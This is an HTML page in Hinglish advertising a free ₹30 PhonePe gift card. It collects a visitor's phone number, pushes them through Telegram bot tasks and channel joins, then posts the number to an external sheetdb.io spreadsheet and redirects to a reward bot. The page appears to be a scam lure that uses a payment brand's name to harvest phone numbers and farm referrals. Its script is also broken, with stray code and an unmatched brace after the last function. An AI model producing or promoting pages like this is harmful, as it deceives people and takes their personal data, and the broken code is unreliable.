<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get ₹30 PhonePe Gift Card</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #6a1b9a; padding: 20px; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: #ffffff; padding: 25px 20px; border-radius: 20px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        .logo-img { width: 90px; height: 90px; object-fit: contain; margin-bottom: 10px; }
        .loot-title { color: #d81b60; font-size: 20px; font-weight: 800; margin-bottom: 5px; }
        .subtitle { color: #2e7d32; font-weight: bold; font-size: 15px; margin-bottom: 15px; }
        .reward-box { display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 18px; font-weight: bold; color: #5e35b1; margin-bottom: 15px; background: #ede7f6; padding: 10px; border-radius: 10px; }
        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 2px solid #ce93d8; border-radius: 10px; font-size: 15px; outline: none; text-align: center; }
        .btn { width: 100%; background: #66bb6a; color: white; padding: 14px; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 4px 10px rgba(102, 187, 106, 0.4); margin-bottom: 12px; }
        .btn-telegram { background: #0088cc; }
        .btn-claim { background: #d81b60; color: white; font-weight: bold; padding: 15px; font-size: 18px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
        .step { display: none; }
        .active { display: block; }
    </style>
</head>
<body>

<div class="card">
    <img src="Image.jpg" alt="Gift Card" class="logo-img">
    <div class="loot-title">Get ₹30 PhonePe Gift Card</div>
    <div class="subtitle">Findo Lucky Special Task</div>
    <div class="reward-box"><span>🎁 ₹30 PhonePe Gift Card</span></div>

    <!-- Step 1: Mobile -->
    <div id="step1" class="step active">
        <input type="text" id="contactInfo" placeholder="Enter Your Phone Number">
        <button class="btn" onclick="submitData()">Submit & Claim</button>
    </div>

    <!-- Step 2: Task -->
    <div id="step2" class="step">
        <p style="font-size:14px; color:#555;">Niche button par click karke <b>Findo Lucky Task</b> pura karein:</p>
        <button class="btn" onclick="openTask()">1. Go To Task Link</button>
    </div>

    <!-- Step 3: Channels -->
    <div id="step3" class="step">
        <p style="font-size:14px; color:#555;">Verification ke liye <b>dono Channels</b> Join Karein:</p>
        <button class="btn btn-telegram" onclick="openChannel1()">2. Join Channel 1</button>
        <button class="btn btn-telegram" onclick="openChannel2()">3. Join Channel 2</button>
    </div>

    <!-- Step 4: Direct Claim Button (No 36-48 Hours Text) -->
    <div id="step4" class="step">
        <p style="font-size:16px; color:#2e7d32; font-weight:bold; margin-bottom:5px;">✅ Tasks Completed!</p>
        <p style="font-size:14px; color:#555; margin-bottom:20px;">Niche click karke Telegram Bot se instant reward lein:</p>
        <button class="btn btn-claim" onclick="claimReward()">🎁 CLAIM GIFT CARD NOW</button>
    </div>
</div>

<script>
    let savedInfo = "";

    function submitData() {
        savedInfo = document.getElementById('contactInfo').value;
        if(!savedInfo) return alert("Kripya apna number daalein!");
        document.getElementById('step1').classList.remove('active');
        document.getElementById('step2').classList.add('active');
    }

    function openTask() {
        window.open("https://t.me/findoluckybot/app?startapp=Njc5NDM2MzgxMF8x", "_blank");
        setTimeout(() => {
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.add('active');
        }, 2000);
    }

    function openChannel1() { window.open("https://t.me/findolucky", "_blank"); }

    function openChannel2() {
        window.open("https://t.me/+PIzW1L82h2g2Y2Nl", "_blank");
        setTimeout(() => {
            document.getElementById('step3').classList.remove('active');
            document.getElementById('step4').classList.add('active');
        }, 1500);
    }

    function claimReward() {
    // Data save karna (Optional, agar aapko user ka record rakhna hai)
    fetch('https://sheetdb.io/api/v1/obju8xm02uv6k', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ "Phone": savedInfo, "Status": "Clicked Claim", "Date": new Date().toLocaleString() })
    });

    // Aapka SAHI bot username link
    window.open("https://t.me/PhonepayReward_Bot", "_blank");
}
        
        // Bot par redirection
        window.open("https://t.me/PhonepayReward_bot", "_blank");
    }
</script>

</body>
</html>
